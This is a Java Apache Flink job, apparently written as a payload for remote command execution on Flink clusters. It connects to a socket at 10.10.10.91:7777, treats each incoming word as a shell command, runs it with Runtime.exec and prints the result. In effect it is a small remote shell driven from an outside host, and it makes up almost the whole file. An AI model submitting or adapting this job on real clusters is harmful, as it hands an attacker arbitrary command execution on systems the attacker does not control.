package com.r4v3zn;

import org.apache.flink.api.common.functions.FlatMapFunction;
import org.apache.flink.api.java.tuple.Tuple2;
import org.apache.flink.streaming.api.datastream.DataStreamSource;
import org.apache.flink.streaming.api.datastream.SingleOutputStreamOperator;
import org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;
import org.apache.flink.streaming.api.functions.source.SocketTextStreamFunction;
import org.apache.flink.util.Collector;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;

/**
 * Title: SocketTextStreamExecute
 * Descrption: TODO
 * Date:2019-11-13 18:48
 * Email:woo0nise@gmail.com
 * Company:www.j2ee.app
 *
 * @author R4v3zn
 * @version 1.0.0
 */
public class SocketTextStreamExecute {

    public static void main(String[] args) throws Exception {
        final StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();
        DataStreamSource<String> stream = env.socketTextStream("10.10.10.91", 7777);
        stream.flatMap(new LineSplitter());
        env.execute("execute code");
    }

    public static final class LineSplitter implements FlatMapFunction<String, Tuple2<String, Integer>> {

        @Override
        public void flatMap(String s, Collector<Tuple2<String, Integer>> collector) {
            String[] tokens = s.toLowerCase().split("\\W+");
            for (String token : tokens) {
                if (token.length() > 0) {
                    try {
                        Process p = Runtime.getRuntime().exec(token);
                        //取得命令结果的输出流
                        InputStream fis=p.getInputStream();
                        //用一个读输出流类去读
                        InputStreamReader isr=new InputStreamReader(fis);
                        //用缓冲器读行
                        BufferedReader br=new BufferedReader(isr);
                        String line=null;
                        //直到读完为止
                        while((line=br.readLine())!=null)
                        {
                            System.out.println(line);
                        }
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                    System.out.println("token --> "+token);
                }
            }
        }
    }
}
